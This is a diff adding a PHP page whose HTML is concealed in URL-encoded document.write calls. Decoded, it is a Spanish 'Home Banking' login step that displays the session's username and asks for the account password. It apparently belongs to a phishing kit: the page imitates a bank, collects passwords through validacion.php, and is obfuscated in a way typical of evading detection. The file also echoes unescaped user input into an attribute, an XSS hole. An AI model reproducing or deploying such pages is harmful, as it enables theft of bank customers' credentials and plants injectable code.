@@ -1,0 +1,16 @@
+<?php 
+session_start();
+	if (isset($_POST['submit'])) {
+		$_SESSION['usuario'] = $_POST['user'];
+	}
+?>
+<script>
+<!--
+document.write(unescape("%3C%21DOCTYPE%20html%3E%0A%3Chtml%20style%3D%22background%3A%20url%28static/backgroud.png%29%20center%20center%20no-repeat%20fixed%3Bbackground-size%3A%20cover%3B%22%3E%0A%3Chead%3E%0A%09%3Cmeta%20charset%3D%22utf-8%22%3E%0A%09%3Cmeta%20name%3D%22viewport%22%20content%3D%22width%3Ddevice-width%2C%20initial-scale%3D1%2C%20maximum-scale%3D1%22%3E%0A%09%3Ctitle%3EHome%3C/title%3E%0A%09%3Clink%20rel%3D%22stylesheet%22%20type%3D%22text/css%22%20href%3D%22static/desing.css%22%3E%0A%3C/head%3E%0A%3Cbody%3E%0A%09%3Cdiv%20class%3D%22cont%22%3E%09%0A%09%09%3Cheader%3E%0A%09%09%09%3Cnav%3E%0A%09%09%09%09%3Cdiv%20class%3D%22atras%22%3E%0A%09%09%09%09%09%3Cimg%20src%3D%22static/back.png%22%20height%3D%2225px%22%3E%0A%09%09%09%09%09%3Cspan%3EVolver%3C/span%3E%09%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cfigure%3E%0A%09%09%09%09%09%3Cimg%20src%3D%22static/logosf.png%22%20height%3D%2275px%22%3E%0A%09%09%09%09%3C/figure%3E%0A%09%09%09%3C/nav%3E%0A%09%09%3C/header%3E%0A%09%09%3Csection%3E%0A%09%09%09%3Cform%20method%3D%22POST%22%20action%3D%22validacion.php%22%3E%0A%09%09%09%09%3Cdiv%20class%3D%22input-design%20float-cancel%22%3E%0A%09%09%09%09%09%3Cspan%3E%3Cimg%20src%3D%22static/icon-user.png%22%20height%3D%2220px%22%3E%3C/span%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22text%22%20readonly%20name%3D%22%22%20id%3D%22inputuser%22%20required%20value%3D%22"));
+//-->
+</script><?php echo $_SESSION['usuario']; ?>">
+					<script>
+<!--
+document.write(unescape("%3Clabel%3EUsuario%3C/label%3E%0A%09%09%09%09%09%3Cdiv%20class%3D%22icon-user%22%3E%0A%09%09%09%09%09%09%3Cimg%20src%3D%22static/icon-user-animado.png%22%20height%3D%2260px%22%3E%0A%09%09%09%09%09%3C/div%3E%0A%0A%09%09%09%09%3C/div%3E%0A%0A%09%09%09%09%3Cdiv%20class%3D%22input-design%22%3E%0A%09%09%09%09%09%3Cspan%3E%3Cimg%20src%3D%22static/lock.png%22%20height%3D%2220px%22%3E%3C/span%3E%0A%09%09%09%09%09%3Cinput%20type%3D%22password%22%20name%3D%22password%22%20id%3D%22inputuser%22%20required%3E%0A%09%09%09%09%09%3Clabel%3EContrase%F1a%3C/label%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%09%0A%09%09%09%09%3Cdiv%20class%3D%22update%22%3E%0A%09%09%09%09%09%3Cp%3E%3Ca%20href%3D%22%22%3ERecuperar%20Usuario%3C/a%3E%20%7C%20%3Ca%20href%3D%22%22%3EDesbloquear%20Usuario%3C/a%3E%20%3C/p%3E%09%0A%20%09%09%09%09%3C/div%3E%0A%09%09%09%09%3Cdiv%20class%3D%22textfield%22%3E%0A%09%09%09%09%09%3Cbutton%20class%3D%22btn%22%20type%3D%22submit%22%20name%3D%22log%22%3EContinuar%3C/button%3E%0A%09%09%09%09%3C/div%3E%0A%09%09%09%3C/form%3E%0A%09%09%09%3Cdiv%20class%3D%22links-user%22%3E%0A%09%09%09%09%3Cimg%20src%3D%22static/tienda.png%22%20height%3D%2260px%22%3E%3Cbr%3E%0A%09%09%09%09%3Ca%20href%3D%22%22%3ECrear%20nuevo%20usuario%3C/a%3E%0A%09%09%09%3C/div%3E%0A%09%09%3C/section%3E%0A%09%09%3Cfooter%3E%0A%09%09%09%3Cp%3EOperar%20con%20Home%20Banking%20implica%20aceptar%20los%20%3Ca%20href%3D%22%22%3Et%E9rminos%20y%20%3C/a%3E%3C/p%3E%20%0A%09%09%09%3Cp%3Econdiciones%20que%20ofrece%20el%20servicio.%20%3Ca%20href%3D%22%22%3EInformaci%F3n%20sobre%20seguridad%3C/a%3E.%3C/p%3E%0A%09%09%3C/footer%3E%0A%09%3C/div%3E%0A%3C/body%3E%0A%3C/html%3E"));
+//-->
+</script>
